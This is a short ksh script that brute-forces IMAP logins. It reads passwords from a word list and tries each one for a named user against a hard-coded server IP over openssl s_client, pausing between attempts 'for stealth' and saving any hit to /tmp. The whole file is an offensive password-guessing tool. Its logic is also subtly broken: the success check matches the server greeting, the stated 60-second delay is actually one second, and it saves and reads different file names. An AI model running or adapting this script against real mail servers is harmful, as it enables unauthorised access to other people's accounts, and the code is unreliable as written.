#!/bin/ksh

# Configuration
server="194.108.117.16"   # IMAP server address
port=993                    # IMAP SSL port
username="demo"         # Target username
passlist="words"     # Password list file
delay=01                   # Delay in seconds

found=0
correct_password=""

# Function to attempt login via openssl
try_imap() {
    password="$1"
    response=$(echo -e "a login $username $password\r\n" | openssl s_client -connect "$server:$port" -quiet 2>/dev/null)

    # Check for successful login indicator
    if echo "$response" | grep -q "* OK"; then
        echo "Password found: $password"
        echo "$password" > /tmp/imap_found_password.txt
        found=1
        exit 0
    else
        echo "Failed: $password"
    fi
}

# Read password list
while IFS= read -r password; do
    if [ "$found" -eq 1 ]; then
        break
    fi

    try_imap "$password"
    echo "Waiting 60 seconds for stealth..."
    sleep "$delay"
done < "$passlist"

if [ "$found" -eq 1 ]; then
    echo "Success! Password: $(cat imap_password.txt)"
else
    echo "Password not found in list."
fi